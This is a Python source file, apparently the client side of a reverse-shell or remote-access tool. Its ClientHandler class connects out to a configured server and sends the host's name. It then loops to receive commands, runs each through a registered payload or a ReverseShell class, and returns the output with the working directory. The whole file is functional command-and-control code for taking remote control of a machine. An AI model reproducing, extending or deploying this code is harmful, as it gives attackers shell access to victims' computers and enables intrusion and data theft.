
import os
import socket
import time
import signal
import sys
import struct
from client import settings
from client.abstract_client_handler import AbstractClientHandler
from utils.debug_error_handler import ErrorLogHandler

error_logger= ErrorLogHandler()

class ClientHandler(AbstractClientHandler):

    @classmethod
    def inject_dependencies(cls, *args, **kwargs) -> bool:
        try:
            cls.payload_register=kwargs.pop("payload_register")
            cls.ReverseShell=kwargs.pop("ReverseShell")
            return True
        except Exception as e:
            error_logger.logError(sys.exc_info(), e, True)
            return False
    
    def __init__(self):
        self.serverHost = settings.SERVER_ADDR
        self.serverPort = settings.SERVER_PORT
        self.socket = None

    def register_signal_handler(self):
        signal.signal(signal.SIGINT, self.quit_gracefully)
        signal.signal(signal.SIGTERM, self.quit_gracefully)
        return

    def quit_gracefully(self, signal=None, frame=None):
        print('\nQuitting gracefully')
        if self.socket:
            try:
                self.socket.shutdown(2)
                self.socket.close()
            except Exception as e:
                error_logger.logError(sys.exc_info(), e, True)
                print('Could not close connection %s' % str(e))
        sys.exit(0)
        return

    def socket_create(self):
        try:
            self.socket = socket.socket()
        except socket.error as e:
            error_logger.logError(sys.exc_info(), e, True)
            print("Socket creation error" + str(e))
            return
        return

    def socket_connect(self):
        """ Connect to a remote socket """
        try:
            self.socket.connect((self.serverHost, self.serverPort))
        except socket.error as e:
            error_logger.logError(sys.exc_info(), e, True)
            print("Socket connection error: " + str(e))
            time.sleep(settings.RETRY_TIME)
            raise
        try:
            self.socket.send(str.encode(socket.gethostname()))
        except socket.error as e:
            error_logger.logError(sys.exc_info(), e, True)
            print("Cannot send hostname to server: " + str(e))
            raise
        return

    def send_output(self, output_str):
        sent_message = str.encode(output_str + str(os.getcwd()) + '> ')
        self.socket.send(struct.pack('>I', len(sent_message)) + sent_message)
        print(output_str)
        return

    def receive_commands(self):
        try:
            self.socket.recv(10)
        except Exception as e:
            error_logger.logError(sys.exc_info(), e, True)
            print('Could not start communication with server: %s\n' %str(e))
            return
        cwd = str.encode(str(os.getcwd()) + '> ')
        self.socket.send(struct.pack('>I', len(cwd)) + cwd)
        while True:
            output_str = None
            data = self.socket.recv(20480)
            if data == b'' or len(data)==0: break
            try:
                valid_commands=[i for i,c in self.payload_register.items()]
                if len(data.decode("utf-8").split())<1:
                    self.send_output("....\n")
                    continue
                if data.decode("utf-8").split()[0] in valid_commands:
                    payload_class=self.payload_register[data.decode("utf-8").split()[0]]
                    output_str=payload_class().execute_payload(data)
                elif len(data) > 0:
                    output_str= self.ReverseShell().execute_payload(data)
                self.send_output(output_str)
            except Exception as e:
                error_logger.logError(sys.exc_info(), e, True)
                self.send_output("Error occured while trying to process command:{}\n".format(e))
                continue

                
                
